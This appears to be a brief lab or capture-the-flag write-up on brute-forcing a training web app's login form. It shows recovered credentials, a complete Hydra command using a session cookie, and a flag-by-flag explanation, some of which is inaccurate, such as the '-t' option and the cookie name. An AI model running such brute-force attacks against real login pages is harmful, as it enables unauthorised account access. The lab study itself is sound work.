Basic login bruteforcing using the most common passwords (online resources + Hydra cracking software on a Debian 10 VM).
Login : root
Password : shadow

With Hydra, run :
hydra -l root -p shadow -v -V 192.168.99.100 http-get-form "/?page=signin:username=^USER^&password=^PASS^&Login=Login#:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=68934a3e9455fa72420237eb05902327" -t 10

[ Hydra explanation ]

-l : login
-p : password
[OR] -P : password dictionary/list (file containing multiple passwords to try out)
-v -V : verbose mode, every attempt output is displayed
192.X.X.X : URL
http-get-form : protocol used (here it is a basic GET form)
"/?page=signin:..." : URL format returned by the form, ^USER^ and ^PASS^ are filled with arguments supplied
H=Cookie: security=low; PHPSESSID=68934a3e9455fa72420237eb05902327" : GET forms use cookies for authentication, you can find it by inspecting the page (Here its name is "I_am_admin") 
-t 10 : number of tasks to complete per minute (from 1 to 64), useful when using dictionaries
